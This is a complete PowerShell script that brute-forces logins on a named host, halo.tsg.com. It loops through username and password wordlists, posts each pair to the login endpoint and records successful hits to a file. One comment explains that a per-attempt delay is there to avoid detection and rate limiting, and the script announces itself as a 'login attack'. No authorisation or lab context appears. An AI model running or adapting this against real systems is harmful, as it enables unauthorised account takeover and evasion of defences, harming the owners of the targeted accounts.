# Target Information
$TargetURL = "https://halo.tsg.com"
$LoginEndpoint = "/login"
$LoginURL = "$TargetURL$LoginEndpoint"

# Credential Files (Ensure these exist)
$Usernames = Get-Content ".\usernames.txt"  # Example: admin, test, user
$Passwords = Get-Content ".\passwords.txt"  # Example: password123, qwerty, letmein

# Output file for results
$OutputFile = "LoginAttempts.txt"
Clear-Content -Path $OutputFile -ErrorAction SilentlyContinue

# Custom Headers
$Headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "Accept" = "application/json, text/plain, */*"
    "Content-Type" = "application/x-www-form-urlencoded"
}

# Attempt logins
foreach ($Username in $Usernames) {
    foreach ($Password in $Passwords) {
        $PostParams = @{
            "username" = $Username
            "password" = $Password
        }

        try {
            $Response = Invoke-WebRequest -Uri $LoginURL -Method Post -Headers $Headers -Body $PostParams -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
            $StatusCode = $Response.StatusCode

            if ($StatusCode -eq 200 -or $StatusCode -eq 302) {
                Write-Host "[+] SUCCESS: $Username / $Password -> $LoginURL" -ForegroundColor Green
                Add-Content -Path $OutputFile -Value "[+] SUCCESS: $Username / $Password -> $LoginURL"
            } else {
                Write-Host "[-] Failed ($StatusCode): $Username / $Password" -ForegroundColor Red
            }
        } catch {
            $ErrorMessage = $_.Exception.Response.StatusCode.value__
            if ($ErrorMessage -eq 403) {
                Write-Host "[403] Forbidden: $Username / $Password" -ForegroundColor Magenta
            } elseif ($ErrorMessage -eq 401) {
                Write-Host "[401] Unauthorized: $Username / $Password" -ForegroundColor Cyan
            } else {
                Write-Host "[-] Failed: $Username / $Password (Error: $ErrorMessage)" -ForegroundColor Gray
            }
            Add-Content -Path $OutputFile -Value "[-] Failed: $Username / $Password (Error: $ErrorMessage)"
        }

        # Optional delay to avoid detection/rate limiting
        Start-Sleep -Seconds 1
    }
}

Write-Host "`n[!] Login attack complete. Results saved to: $OutputFile" -ForegroundColor Cyan
